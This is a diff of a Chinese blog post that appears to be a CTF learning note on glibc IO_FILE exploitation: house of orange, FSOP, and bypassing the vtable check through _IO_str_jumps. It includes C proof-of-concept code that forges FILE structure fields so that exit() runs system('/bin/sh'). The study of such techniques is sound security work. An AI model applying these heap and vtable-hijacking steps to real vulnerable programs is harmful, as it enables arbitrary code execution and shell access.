@@ -6,17 +6,25 @@ date: 2023-11-09 20:39:36
 ---
 以house of orange为首的IO_FILE利用
 <!-- more -->
+
 [toc]
 
-# IO_FILE
 
-## IO_FILE leak
+# IO_FILE之任意读写
 
-将`_IO_2_1_stdout_`结构体中的`_flags`变量覆盖为`0xfbad1800`，然后将结构体中的`_IO_write_base`和`_IO_write_ptr`分别指向要输出的开始处的地址和结束处的地址即可完成输出。
+## 使用stdin标准输入进行任意写
 
-## House of orange
+若我们可以控制`_IO_FILE`的指针，且程序中会调用`fgets`或者`fread`等函数，那么我们便可以利用`stdin`来进行任意地址写。
 
-`IO_FILE`相关的知识一直不太了解，因此就以`house of orange`的利用来认真学习一下。
+## 使用stdout标准输出进行任意读写
+
+### 任意读
+
+### 任意写
+
+
+
+# House of orange🍊
 
 一句话描述该漏洞：将`top chunk`置入`unsortedbin`并打`unsortedbin attack`对`_IO_list_all`写入`main_arena+88`，将该`chunk`置入`smallbin`，使其`_IO_list_all`的`_chain`刚好指向该`chunk`，便可劫持`vtable`来触发`FSOP`。
 
@@ -29,7 +37,7 @@ date: 2023-11-09 20:39:36
 
 以上就是`House of orange`的简要流程，整个流程在我第一次见的时候是相当震撼的，因此只能慢慢嚼碎再咽下去。
 
-### 0x00: 将top chunk置入unsortedbin
+## 0x00: 将top chunk置入unsortedbin
 
 需要利用的漏洞：控制`top chunk`的`size`
 
@@ -60,7 +68,7 @@ char* p2 = malloc(0x1000); // 申请一个大于top chunk size的内存空间，
 
 ![image-20231109151602936](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20231109151602936.png)
 
-### 0X01: 使用Unsortedbin attack改写_IO_list_all指针
+## 0X01: 使用Unsortedbin attack改写_IO_list_all指针
 
 需要利用的漏洞：`unsortedbin attack`，需要你能够控制刚刚的`top chunk`的`bk`指针
 
@@ -73,7 +81,7 @@ io_list_all = top[2] + 0x9a8; // 由此也可以获得libc固定偏移的io_list
 top[3] = io_list_all - 0x10; // 将top chunk的bk写为io_list_all-0x10，触发unsortedbin attack
 ```
 
-### 0x02: 将top chunk置入smallbin使得_chain指向该chunk
+## 0x02: 将top chunk置入smallbin使得_chain指向该chunk
 
  需要利用的漏洞：仍然是控制`top chunk`即可
 
@@ -93,7 +101,7 @@ top[1] = 0x61; // 更改top chunk的size为0x61，在触发unsortedbin attack后
 // 这是因为main_arena + 192是指向大小为0x60的smallbin的最后一个chunk的，如此以来第一个_IO_FILE_plus的_chain指向top chunk
 ```
 
-### 0x03: 满足利用条件，触发FSOP调用链获得shell
+## 0x03: 满足利用条件，触发FSOP调用链获得shell
 
 需要利用的漏洞：控制`top chunk`即可
 
@@ -167,9 +175,9 @@ int winner(char *ptr)
 
 [借助gdb调试glibc代码学习House of Orange - 简书 (jianshu.com)](https://www.jianshu.com/p/57a5c9a492aa?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)
 
-## glibc2.24下的vtable check以及绕过
+# glibc2.24下的vtable check以及绕过
 
-### vtable的check
+## vtable的check
 
 在`glibc 2.23`中，我们可以劫持`_IO_FILE_plus`中的`vtable`，并使其指向我们可控的内存区域，便可使用`FSOP`等方式调用我们所需的函数。
 
@@ -242,7 +250,7 @@ IO_validate_vtable (const struct _IO_jump_t *vtable)
 
 根据以上知识，我们可以得知，上面的代码将会校验`_IO_FILE_plus`的虚表是否位于存放虚表的那一片空间内，若不位于存放虚表的那片空间，则会进一步通过`_IO_vtable_check()`函数进行校验，而该函数较难进行绕过，因此我们在`glibc2.23`下已经无法通过以前的方式对`vtable`进行劫持了。
 
-### 柳暗花明
+## 柳暗花明
 
 我们上面提到：
 
@@ -252,7 +260,7 @@ IO_validate_vtable (const struct _IO_jump_t *vtable)
 
 劫持为其他虚表后，我们可以利用逻辑上的一些问题进行攻击。
 
-### vtable check的绕过（<=glibc2.27可用）
+## 新的利用链 _IO_flush_all_lockp -> _IO_str_finish（<=glibc2.27可用）
 
 我们上面已知可以合法的将`_IO_FILE_plus`的`vtable`劫持为`_IO_str_jumps`虚表。那这有什么作用呢？
 
@@ -400,3 +408,82 @@ int main(){
 - `fp -> _IO_buf_base`存放要执行函数的参数的地址，偏移为`0x38`
 - `(_IO_strfile* )fp -> _s._free_buffer`存放要执行的函数，对应偏移为`0xe8`
 
+## 另一条调用链 _IO_flush_all_lockp -> _IO_str_overflow（<=glibc2.27可用）
+
+原理和上面的利用链是一样的，我们此处不再详细阐述，仅仅写下需要构造的条件来供查阅。
+
+- `fp -> _flag`最低两字节为`0`。其偏移为`0`。
+- `fp -> _vtable`指向`_IO_str_jumps`。`_vtable`偏移为`0xd8`
+- 偏移`0xe0`处为要执行的函数，例如`system`
+- `fp -> _IO_buf_base`为`0`，其偏移为`0x38`
+- `fp -> _IO_buf_end`为`(bin_sh_addr - 100) / 2`，其偏移为`0x40`。其中`bin_sh_addr`是函数参数的地址，若为奇数需要`+1`
+- `fp -> _IO_write_base`为`0`，其偏移为`0x20`
+- `fp -> _IO_write_ptr`为`0`，其偏移为`(bin_sh_addr - 100) / 2 + 1`
+
+上面是通常情况下可以调用函数的参数设置，也可以看下面的C语言实现，其中注释包含了详细的要求：
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void winner(char* code){
+    // system("echo win");
+    printf("you got it!\n");
+    printf("The code is :%s.\n", code);
+    system(code);
+}
+
+// fake_vtable.c中写的是利用_IO_str_jump表中的_IO_finish函数，而本代码中使用_IO_str_jump表中的_IO_overflow函数
+int main(){
+    // 我们通过打开一个文件的方式，来得到一个_IO_FILE_plus指针fp
+    FILE* fp = fopen("./flag", "r");
+
+    // _IO_write_base相对于fp偏移为0x20
+    // _IO_write_ptr为0x28
+    // _IO_buf_base为0x38
+    // _IO_buf_end为0x40
+
+    // 要满足fp->_flags & _IO_NO_WRITES 为假，而_IO_NO_WRITES的值为8，因此倒数第二个字节要为0
+    // 又要满足fp->_flags & _IO_USER_BUF为假，而_IO_USER_BUF的值为1，因此最后一个字节也为0
+    *(short*)fp = 0;
+
+    // 虚表指向_IO_str_jumps
+    *(size_t*)((char*)fp + 0xd8) = *(size_t*)(((char*)fp + 0xd8)) + 0xc0;
+
+    // 此时偏移0xe0处是要执行的函数_IO_str_overflow
+    *(size_t*)((char*)fp + 0xe0) = (size_t)winner;
+
+    // 函数参数：new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100
+    // 为了方便我们一般直接设置fp->_IO_buf_base为0，方便计算，那么2 * fp->_IO_buf_end + 100 需要等于函数参数例如/bin/sh的地址
+    // 换算一下也就是 _IO_buf_end = (bin_sh_addr - 100) / 2，注意当bin_sh_addr为奇数的时候向下取整，因此地址为奇数的时候直接将其+1
+    *(size_t*)((char*)fp + 0x38) = 0;
+    char* code = "/bin/sh\x00";
+    size_t address = (size_t)code % 2 == 0 ? (size_t)code : (size_t) code + 1; 
+    *(size_t*)((char*)fp + 0x40) = (size_t)((address - 100) / 2);
+    
+    // 下一个条件： 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100不能为负数，由于其为函数参数上面已经构造，不再需要管
+
+    // 下一个条件：(pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1))
+    // 我们已经知道fp->_IO_buf_base为0，_IO_buf_end为(bin_sh_addr - 100)/2
+    // 那么在同样设置fp->_IO_write_base为0的情况下，需要fp->_IO_write_ptr >= (bin_sh_addr - 100)/2 + 1
+    *(size_t*)((char*)fp + 0x20) = 0;
+    *(size_t*)((char*)fp + 0x28) = (size_t)((address - 100) / 2 + 1);
+    
+    
+
+    exit(1);
+    // // 最终会在exit、return、以及libc执行abort调用。
+    return 0;
+}
+```
+
+## 后记
+
+绕过`vtable check`的方法除了`_IO_str_jumps`虚表，`_IO_wstr_jumps`虚表也是同样的。`_IO_wstr_jumps`和`_IO_str_jumps`功能基本一致，只是`_IO_wstr_jumps`是处理`wchar`的。
+
+上面提到了这些`vtable check`的绕过方法都只是在`glibc2.27`及以下可用，因为到了`glibc2.28`中，`_IO_strfile`中的`_allocate_buffer`和`_free_buffer`已经被简单粗暴地用`malloc`和`free`来替换了，自然也就没有函数指针用于覆盖。
+
+参考链接：
+
+[raycp师傅的IO_FILE vtable绕过](https://xz.aliyun.com/t/5579#toc-1)
